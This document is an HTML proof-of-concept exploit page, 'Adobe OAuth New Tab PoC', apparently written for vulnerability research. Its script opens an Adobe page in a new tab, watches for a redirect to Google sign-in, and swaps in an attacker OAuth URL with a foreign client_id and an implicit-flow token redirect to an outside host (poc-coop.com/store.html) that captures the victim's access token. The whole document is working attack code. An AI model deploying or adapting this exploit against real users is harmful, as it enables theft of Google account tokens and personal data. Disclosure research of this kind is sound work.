<!DOCTYPE html>
<html>
<head>
  <title>Adobe OAuth New Tab PoC</title>
  <style>
    body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
    button { padding:10px 20px; margin-top:20px; background:#4caf50; color:white; border:none; cursor:pointer; }
    #log { margin-top:20px; background:#000; color:#0f0; padding:10px;
           font-family:monospace; height:200px; width:95%; overflow-y:auto; }
  </style>
</head>
<body>
  <h2>Adobe OAuth New Tab PoC</h2>
  <button onclick="launch()">Exploit</button>
  <div id="log"></div>

<script>
function log(msg){
  document.getElementById("log").innerHTML += msg + "<br>";
  let box=document.getElementById("log"); box.scrollTop=box.scrollHeight;
}

let tab;
let attackOAuth = "https://accounts.google.com/o/oauth2/v2/auth?" +
  "client_id=50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com" +
  "&redirect_uri=" + encodeURIComponent("https://poc-coop.com/store.html") +
  "&response_type=token" +
  "&scope=" + encodeURIComponent("openid profile email");

function launch(){
  let urlParam = new URLSearchParams(window.location.search).get("url");
  if (!urlParam) {
    log("❌ Missing ?url= parameter, e.g. ?url=https://photoshop.adobe.com/");
    return;
  }
  log("▶ Opening in new tab: " + urlParam);
  tab = window.open(urlParam, "_blank");   // "_blank" forces new tab

  setTimeout(monitor, 2000);
}

function monitor(){
  if (!tab || tab.closed) {
    log("❌ Tab closed, stopping monitor.");
    return;
  }

  try {
    let loc = tab.location.href;
    log("Monitoring: " + loc);

    if (loc.includes("accounts.google.com")) {
      log("⚠ Google OAuth detected → swapping client_id");
      tab.location.replace(attackOAuth);
      return;
    }
  } catch(e) {
    // Expected when it’s cross-origin (Adobe/Google)
    log("Cross-origin, waiting...");
  }

  setTimeout(monitor, 1000);
}
</script>
</body>
</html>
